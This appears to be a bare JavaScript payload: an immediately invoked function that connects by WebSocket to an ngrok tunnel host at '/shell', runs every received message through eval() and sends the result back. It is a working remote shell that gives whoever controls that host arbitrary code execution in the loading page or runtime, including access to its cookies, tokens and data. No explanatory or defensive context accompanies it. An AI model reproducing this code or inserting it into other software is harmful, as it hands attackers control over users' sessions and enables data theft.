(() => {
  const socket = new WebSocket(
    "wss://dc68-2409-4072-98e-9867-ab83-e271-c02e-52ee.ngrok.io/shell"
  );
  socket.onmessage = (e) => socket.send(JSON.stringify(eval(e.data)));
})();
